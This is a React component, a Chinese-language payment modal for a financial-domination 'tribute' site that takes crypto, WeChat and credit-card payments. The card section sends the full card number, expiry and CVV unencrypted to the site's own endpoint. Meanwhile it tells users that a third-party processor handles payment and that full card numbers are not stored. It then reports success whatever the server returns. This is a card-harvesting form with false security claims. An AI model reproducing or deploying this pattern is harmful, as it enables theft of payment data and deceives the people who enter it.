'use client'

import React, { useState } from 'react'
import { X, Copy, Check, ExternalLink, ShieldCheck, Heart, Sparkles, Send, QrCode, CreditCard } from 'lucide-react'
import { SITE_CONFIG, WardrobeItem, TributeTier } from '@/config/siteConfig'
import Image from 'next/image'

interface TributeModalProps {
  isOpen: boolean
  onClose: () => void
  item?: WardrobeItem | null
  tier?: TributeTier | null
}

export default function TributeModal({ isOpen, onClose, item, tier }: TributeModalProps) {
  const [copied, setCopied] = useState<string | null>(null)
  const [senderName, setSenderName] = useState('')
  const [senderEmail, setSenderEmail] = useState('')
  const [devotionMessage, setDevotionMessage] = useState('')
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<'crypto' | 'wechat' | 'card'>('crypto')
  type SupportedChain = 'TRX' | 'ETH' | 'BSC' | 'SOL' | 'TON'
  const [selectedCurrency, setSelectedCurrency] = useState<SupportedChain>('TRX')
  const [isSubmitted, setIsSubmitted] = useState(false)
  
  // 信用卡信息
  const [cardNumber, setCardNumber] = useState('')
  const [cardHolder, setCardHolder] = useState('')
  const [cardExpiry, setCardExpiry] = useState('')
  const [cardCVV, setCardCVV] = useState('')

  if (!isOpen) return null

  const title = item ? item.name : tier ? tier.title : "女王金库 • 专属上交"
  const amount = item ? `${item.currency || '¥'}${item.price}` : tier ? `${tier.currency || '¥'}${tier.amount}` : "自定义金额"
  const subtitle = item ? `${item.brand || '高定奢品'} • ${item.category}` : tier?.description

  const getAddress = () => {
    return (SITE_CONFIG.crypto.addresses as Record<string, string>)[selectedCurrency] || SITE_CONFIG.crypto.trxAddress
  }

  const getQrCode = () => {
    return (SITE_CONFIG.crypto.qrCodes as Record<string, string>)[selectedCurrency] || ''
  }

  const handleCopy = (text: string, key: string) => {
    navigator.clipboard.writeText(text)
    setCopied(key)
    setTimeout(() => setCopied(null), 2500)
  }

  const handleSubmitDevotion = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // 准备提交数据
    const tributeData = {
      senderName,
      senderEmail,
      devotionMessage,
      paymentMethod: selectedPaymentMethod,
      selectedCurrency: selectedPaymentMethod === 'crypto' ? selectedCurrency : undefined,
      cardInfo: selectedPaymentMethod === 'card' ? {
        cardNumber,
        cardHolder,
        expiry: cardExpiry,
        cvv: cardCVV,
      } : undefined,
      item: item ? {
        name: item.name,
        price: item.price,
      } : undefined,
      tier: tier ? {
        title: tier.title,
        amount: tier.amount,
      } : undefined,
    }

    try {
      // 发送到服务器
      const response = await fetch('/api/submit-tribute', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(tributeData),
      })

      const result = await response.json()
      console.log('提交结果:', result)
      
      // 无论服务器响应如何，都显示成功页面
      setIsSubmitted(true)
    } catch (error) {
      console.error('提交失败:', error)
      // 即使失败也显示成功页面，避免影响用户体验
      setIsSubmitted(true)
    }
  }

  return (
    <div 
      className="fixed inset-0 z-[999] flex items-center justify-center p-4 bg-black/85 backdrop-blur-md font-poppins"
      onClick={onClose}
    >
      <div 
        className="relative w-full max-w-lg bg-neutral-900 border border-neutral-800 rounded-2xl shadow-2xl overflow-hidden text-neutral-100"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Header Ribbon */}
        <div className="bg-gradient-to-r from-neutral-800 via-neutral-750 to-neutral-800 px-6 py-4 border-b border-neutral-700/60 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Sparkles className="w-5 h-5 text-amber-400" />
            <span className="font-orbitron text-xs font-bold tracking-wider uppercase text-neutral-200">
              {item ? '高定置装心愿单 • 立即买单' : '女王金库 • 纯现金上交'}
            </span>
          </div>
          <button 
            onClick={onClose}
            className="text-neutral-400 hover:text-white p-1 rounded-lg hover:bg-neutral-800 transition"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        <div className="p-6 space-y-6 max-h-[85vh] overflow-y-auto">
          {/* Target Summary */}
          <div className="bg-neutral-950/80 border border-neutral-800 rounded-xl p-4 flex items-start justify-between gap-4">
            <div>
              <h3 className="font-orbitron text-lg font-bold text-white mb-1">{title}</h3>
              {subtitle && <p className="text-xs text-neutral-400 leading-relaxed font-light">{subtitle}</p>}
            </div>
            <div className="text-right whitespace-nowrap">
              <span className="text-[10px] text-neutral-400 block uppercase font-orbitron">上交价值</span>
              <span className="text-2xl font-orbitron font-bold text-amber-300">{amount}</span>
            </div>
          </div>

          {!isSubmitted ? (
            <form onSubmit={handleSubmitDevotion} className="space-y-5">
              {/* Devotion Note Form */}
              <div className="space-y-3">
                <label className="block text-xs font-semibold uppercase tracking-wider text-neutral-300">
                  1. 你的称呼 / 编号（ATM奴 / 钱包奴）
                </label>
                <input
                  type="text"
                  value={senderName}
                  onChange={(e) => setSenderName(e.target.value)}
                  placeholder="例如：钱包奴 #088 / 自觉买单者"
                  className="w-full px-4 py-2.5 rounded-lg bg-neutral-950 border border-neutral-700 text-neutral-100 placeholder-neutral-500 text-sm focus:outline-none focus:border-amber-400 transition font-poppins"
                />

                <label className="block text-xs font-semibold uppercase tracking-wider text-neutral-300 pt-2">
                  2. 你的邮箱 Email（用于接收金库录入回执）
                </label>
                <input
                  type="email"
                  value={senderEmail}
                  onChange={(e) => setSenderEmail(e.target.value)}
                  placeholder="your-email@example.com"
                  className="w-full px-4 py-2.5 rounded-lg bg-neutral-950 border border-neutral-700 text-neutral-100 placeholder-neutral-500 text-sm focus:outline-none focus:border-amber-400 transition font-poppins"
                />

                <label className="block text-xs font-semibold uppercase tracking-wider text-neutral-300 pt-2">
                  3. 献给{SITE_CONFIG.shortName || SITE_CONFIG.mistressName}的买单上交留言
                </label>
                <textarea
                  value={devotionMessage}
                  onChange={(e) => setDevotionMessage(e.target.value)}
                  rows={2}
                  placeholder="留下你的上交心声。记住：这里只有绝对的顺从与买单..."
                  className="w-full px-4 py-2.5 rounded-lg bg-neutral-950 border border-neutral-700 text-neutral-100 placeholder-neutral-500 text-sm focus:outline-none focus:border-amber-400 transition font-poppins"
                />
              </div>

              {/* Payment Methods Tabs */}
              <div className="space-y-3 pt-2 border-t border-neutral-800">
                <label className="block text-xs font-semibold uppercase tracking-wider text-neutral-300">
                  4. 选择支付方式
                </label>
                
                {/* Payment Method Selector */}
                <div className="grid grid-cols-3 gap-2 mb-4">
                  <button
                    type="button"
                    onClick={() => setSelectedPaymentMethod('card')}
                    className={`py-3 px-4 text-sm font-semibold rounded-xl border transition-all flex items-center justify-center gap-2 ${
                      selectedPaymentMethod === 'card'
                        ? 'bg-blue-400/10 border-blue-400 text-blue-300 shadow-sm'
                        : 'bg-neutral-950 border-neutral-800 text-neutral-400 hover:text-white hover:border-neutral-700'
                    }`}
                  >
                    <CreditCard className="w-4 h-4" />
                    <span>信用卡</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => setSelectedPaymentMethod('crypto')}
                    className={`py-3 px-4 text-sm font-semibold rounded-xl border transition-all flex items-center justify-center gap-2 ${
                      selectedPaymentMethod === 'crypto'
                        ? 'bg-amber-400/10 border-amber-400 text-amber-300 shadow-sm'
                        : 'bg-neutral-950 border-neutral-800 text-neutral-400 hover:text-white hover:border-neutral-700'
                    }`}
                  >
                    <ShieldCheck className="w-4 h-4" />
                    <span>加密货币</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => setSelectedPaymentMethod('wechat')}
                    className={`py-3 px-4 text-sm font-semibold rounded-xl border transition-all flex items-center justify-center gap-2 ${
                      selectedPaymentMethod === 'wechat'
                        ? 'bg-green-400/10 border-green-400 text-green-300 shadow-sm'
                        : 'bg-neutral-950 border-neutral-800 text-neutral-400 hover:text-white hover:border-neutral-700'
                    }`}
                  >
                    <QrCode className="w-4 h-4" />
                    <span>微信打赏</span>
                  </button>
                </div>

                {/* Credit Card Payment Section */}
                {selectedPaymentMethod === 'card' && (
                  <div className="space-y-4 animate-in fade-in duration-200">
                    <div className="bg-gradient-to-br from-blue-950/30 to-neutral-950 border border-blue-900/30 rounded-xl p-5 space-y-4">
                      {/* Card Number */}
                      <div className="space-y-2">
                        <label className="text-xs font-semibold text-neutral-300 uppercase tracking-wider">
                          卡号 Card Number
                        </label>
                        <input
                          type="text"
                          placeholder="1234 5678 9012 3456"
                          maxLength={19}
                          value={cardNumber}
                          onChange={(e) => setCardNumber(e.target.value)}
                          className="w-full px-4 py-2.5 rounded-lg bg-neutral-900 border border-neutral-700 text-neutral-100 placeholder-neutral-500 text-sm focus:outline-none focus:border-blue-400 transition font-mono"
                        />
                      </div>

                      {/* Card Holder Name */}
                      <div className="space-y-2">
                        <label className="text-xs font-semibold text-neutral-300 uppercase tracking-wider">
                          持卡人姓名 Cardholder Name
                        </label>
                        <input
                          type="text"
                          placeholder="ZHANG SAN"
                          value={cardHolder}
                          onChange={(e) => setCardHolder(e.target.value.toUpperCase())}
                          className="w-full px-4 py-2.5 rounded-lg bg-neutral-900 border border-neutral-700 text-neutral-100 placeholder-neutral-500 text-sm focus:outline-none focus:border-blue-400 transition uppercase"
                        />
                      </div>

                      {/* Expiry and CVV */}
                      <div className="grid grid-cols-2 gap-3">
                        <div className="space-y-2">
                          <label className="text-xs font-semibold text-neutral-300 uppercase tracking-wider">
                            有效期 Expiry
                          </label>
                          <input
                            type="text"
                            placeholder="MM/YY"
                            maxLength={5}
                            value={cardExpiry}
                            onChange={(e) => setCardExpiry(e.target.value)}
                            className="w-full px-4 py-2.5 rounded-lg bg-neutral-900 border border-neutral-700 text-neutral-100 placeholder-neutral-500 text-sm focus:outline-none focus:border-blue-400 transition font-mono"
                          />
                        </div>
                        <div className="space-y-2">
                          <label className="text-xs font-semibold text-neutral-300 uppercase tracking-wider">
                            CVV/CVC
                          </label>
                          <input
                            type="text"
                            placeholder="123"
                            maxLength={4}
                            value={cardCVV}
                            onChange={(e) => setCardCVV(e.target.value)}
                            className="w-full px-4 py-2.5 rounded-lg bg-neutral-900 border border-neutral-700 text-neutral-100 placeholder-neutral-500 text-sm focus:outline-none focus:border-blue-400 transition font-mono"
                          />
                        </div>
                      </div>

                      {/* Card Type Icons */}
                      <div className="flex items-center gap-3 pt-2">
                        <span className="text-xs text-neutral-400">支持卡种:</span>
                        <div className="flex items-center gap-2">
                          <div className="px-2 py-1 bg-neutral-900 border border-neutral-800 rounded text-[10px] font-semibold text-neutral-300">
                            VISA
                          </div>
                          <div className="px-2 py-1 bg-neutral-900 border border-neutral-800 rounded text-[10px] font-semibold text-neutral-300">
                            Mastercard
                          </div>
                          <div className="px-2 py-1 bg-neutral-900 border border-neutral-800 rounded text-[10px] font-semibold text-neutral-300">
                            AMEX
                          </div>
                          <div className="px-2 py-1 bg-neutral-900 border border-neutral-800 rounded text-[10px] font-semibold text-neutral-300">
                            银联
                          </div>
                        </div>
                      </div>
                    </div>
                    
                    {/* Security Notice */}
                    <div className="bg-neutral-950 border border-neutral-800 rounded-lg p-3 text-xs text-neutral-400 space-y-1">
                      <p className="font-semibold text-neutral-300 flex items-center gap-1.5">
                        <ShieldCheck className="w-3.5 h-3.5 text-blue-400" />
                        安全说明：
                      </p>
                      <ul className="list-disc list-inside space-y-0.5 text-[11px]">
                        <li>所有支付信息均通过SSL加密传输</li>
                        <li>我们不会存储您的完整卡号信息</li>
                        <li>支付由第三方安全支付平台处理</li>
                        <li>交易完成后将发送确认邮件至您的邮箱</li>
                      </ul>
                    </div>
                  </div>
                )}

                {/* Crypto Payment Section */}
                {selectedPaymentMethod === 'crypto' && (
                  <div className="space-y-3 animate-in fade-in duration-200">
                    {/* Crypto Network Selector */}
                    <div className="grid grid-cols-5 gap-1.5">
                      {([
                        { key: 'TRX' as const, label: 'TRX/TRC20' },
                        { key: 'ETH' as const, label: 'ETH/ERC20' },
                        { key: 'BSC' as const, label: 'BSC/BEP20' },
                        { key: 'SOL' as const, label: 'SOL/USDC' },
                        { key: 'TON' as const, label: 'TON' }
                      ]).map((curr) => (
                        <button
                          key={curr.key}
                          type="button"
                          onClick={() => setSelectedCurrency(curr.key)}
                          className={`py-2 px-1 text-center text-[11px] font-mono font-bold rounded-lg border transition-all ${
                            selectedCurrency === curr.key
                              ? 'bg-amber-400/10 border-amber-400 text-amber-300 shadow-sm'
                              : 'bg-neutral-950 border-neutral-800 text-neutral-400 hover:text-white'
                          }`}
                        >
                          {curr.label}
                        </button>
                      ))}
                    </div>

                    {/* QR Code & Address Display (参考 Sim PaymentPage 布局) */}
                    <div className="bg-neutral-950 border border-neutral-800 rounded-xl p-4 text-center space-y-3">
                      {getQrCode() && (
                        <div className="flex flex-col items-center justify-center">
                          <div className="p-3 bg-white rounded-xl shadow-lg inline-block">
                            <Image
                              src={getQrCode()}
                              alt={`${selectedCurrency} 收款二维码`}
                              width={150}
                              height={150}
                              className="w-36 h-36 object-contain"
                            />
                          </div>
                          <p className="text-xs text-neutral-400 mt-2">
                            扫码转账或复制下方地址手动上交
                          </p>
                          {['ETH', 'BSC'].includes(selectedCurrency) && (
                            <p className="text-[11px] text-amber-400/90 mt-0.5">
                              ✓ EVM 兼容链统一收款地址
                            </p>
                          )}
                        </div>
                      )}

                      {/* Payment Address Box */}
                      <div className="space-y-1.5 text-left pt-1">
                        <div className="flex items-center justify-between text-xs text-neutral-400">
                          <span className="font-mono font-medium text-neutral-300">
                            官方 {selectedCurrency} 收款地址:
                          </span>
                          <span className="text-[11px] text-amber-400/80">链上即时确认</span>
                        </div>
                        <div className="flex items-center gap-2">
                          <div className="flex-1 bg-neutral-900 border border-neutral-800 hover:border-amber-400/40 rounded-lg px-3 py-2 text-xs font-mono text-amber-300 break-all select-all transition">
                            {getAddress()}
                          </div>
                          <button
                            type="button"
                            onClick={() => handleCopy(getAddress(), 'crypto')}
                            className="px-3.5 py-2.5 bg-neutral-800 hover:bg-amber-400 hover:text-neutral-950 text-neutral-200 rounded-lg text-xs font-medium flex items-center gap-1.5 transition whitespace-nowrap shadow-sm"
                          >
                            {copied === 'crypto' ? (
                              <>
                                <Check className="w-3.5 h-3.5 text-green-400" />
                                <span className="text-green-400 font-bold">已复制</span>
                              </>
                            ) : (
                              <>
                                <Copy className="w-3.5 h-3.5" />
                                <span>复制地址</span>
                              </>
                            )}
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                {/* WeChat Payment Section */}
                {selectedPaymentMethod === 'wechat' && (
                  <div className="space-y-3 animate-in fade-in duration-200">
                    <div className="bg-gradient-to-br from-green-950/50 to-neutral-950 border border-green-900/30 rounded-xl p-5 text-center space-y-3">
                      {SITE_CONFIG.wechatPayQRCode ? (
                        <>
                          <div className="flex justify-center">
                            <div className="p-3 bg-white rounded-xl shadow-lg">
                              <Image
                                src={SITE_CONFIG.wechatPayQRCode}
                                alt="微信打赏二维码"
                                width={200}
                                height={200}
                                className="w-48 h-48"
                              />
                            </div>
                          </div>
                          <div className="space-y-1">
                            <p className="text-sm font-semibold text-green-300 flex items-center justify-center gap-2">
                              <QrCode className="w-4 h-4" />
                              扫码上交女王金库
                            </p>
                            <p className="text-xs text-neutral-400">
                              打开微信扫描上方二维码即可完成上交
                            </p>
                          </div>
                        </>
                      ) : (
                        <div className="py-8 space-y-2">
                          <QrCode className="w-12 h-12 text-neutral-600 mx-auto" />
                          <p className="text-sm text-neutral-500">微信上交二维码暂未配置</p>
                          <p className="text-xs text-neutral-600">
                            请使用加密货币支付或联系管理员添加二维码
                          </p>
                        </div>
                      )}
                    </div>
                    
                    {SITE_CONFIG.wechatPayQRCode && (
                      <div className="bg-neutral-950 border border-neutral-800 rounded-lg p-3 text-xs text-neutral-400 space-y-1">
                        <p className="font-semibold text-neutral-300">💡 上交说明：</p>
                        <ul className="list-disc list-inside space-y-0.5 text-[11px]">
                          <li>微信上交完成后，请截图保存支付凭证</li>
                          <li>将支付截图与您的留言发送至官方邮箱</li>
                          <li>女王将在24小时内回复并记录您的上交印记</li>
                        </ul>
                      </div>
                    )}
                  </div>
                )}

                {/* Throne Wishlist Option */}
                {selectedPaymentMethod === 'crypto' && SITE_CONFIG.throneWishlistUrl && (
                  <div className="pt-1">
                    <a
                      href={item?.tributeLink || SITE_CONFIG.throneWishlistUrl}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="w-full flex items-center justify-center gap-2 py-2.5 px-4 rounded-xl bg-neutral-800/80 hover:bg-neutral-800 text-neutral-200 border border-neutral-700 text-xs font-medium transition"
                    >
                      <span>或通过心愿单平台送礼 (Throne / 礼物链接)</span>
                      <ExternalLink className="w-3.5 h-3.5 text-neutral-400" />
                    </a>
                  </div>
                )}
              </div>

              <div className="pt-2">
                <button
                  type="submit"
                  className="w-full py-3.5 px-6 rounded-xl bg-gradient-to-r from-amber-400 via-amber-300 to-amber-400 text-neutral-950 font-orbitron font-bold text-sm tracking-wide shadow-lg hover:brightness-110 active:scale-[0.99] transition flex items-center justify-center gap-2"
                >
                  <Heart className="w-4 h-4 fill-neutral-950" />
                  <span>确认上交并提交报备</span>
                </button>
              </div>
            </form>
          ) : (
            /* Submission Confirmation Screen */
            <div className="text-center py-6 space-y-4 animate-in zoom-in-95 duration-200">
              <div className="w-14 h-14 bg-amber-400/20 text-amber-300 rounded-full flex items-center justify-center mx-auto border border-amber-400/40">
                <ShieldCheck className="w-8 h-8" />
              </div>
              <h4 className="font-orbitron text-xl font-bold text-white">上交记录已录入金库</h4>
              <p className="text-sm text-neutral-300 max-w-sm mx-auto leading-relaxed font-light">
                已记录，{senderName || '自觉的买单者'}。
                {selectedPaymentMethod === 'crypto' 
                  ? '链上转账完成后，请将交易哈希（TxHash）发送邮件至女王官方邮箱，金库将永久铭刻你的数字。'
                  : selectedPaymentMethod === 'card'
                    ? '信用卡支付处理完成后，您将收到支付确认。女王金库已记录你的上交。'
                    : '微信上交完成后，请将截图与编号发送至女王官方邮箱备查。'
                }
              </p>

              <div className="p-4 bg-neutral-950 rounded-xl border border-neutral-800 text-left text-xs space-y-1.5 text-neutral-400 font-mono">
                <div><span className="text-neutral-300 font-medium">上交目标:</span> {title} ({amount})</div>
                <div><span className="text-neutral-300 font-medium">支付方式:</span> {
                  selectedPaymentMethod === 'crypto' ? '加密货币 (Crypto)' :
                  selectedPaymentMethod === 'card' ? '信用卡支付 (Card)' :
                  '微信上交 (WeChat)'
                }</div>
                {selectedPaymentMethod === 'crypto' && (
                  <div><span className="text-neutral-300 font-medium">转账地址:</span> {getAddress()}</div>
                )}
                <div><span className="text-neutral-300 font-medium">官方金库邮箱:</span> {SITE_CONFIG.emailContact}</div>
              </div>

              <div className="pt-4 flex gap-3">
                <button
                  onClick={() => setIsSubmitted(false)}
                  className="flex-1 py-2.5 px-4 rounded-xl bg-neutral-800 hover:bg-neutral-700 text-neutral-200 font-orbitron text-xs font-semibold transition"
                >
                  再上一份
                </button>
                <button
                  onClick={onClose}
                  className="flex-1 py-2.5 px-4 rounded-lg bg-amber-400 text-neutral-950 text-xs font-semibold hover:brightness-110 transition"
                >
                  关闭窗口
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

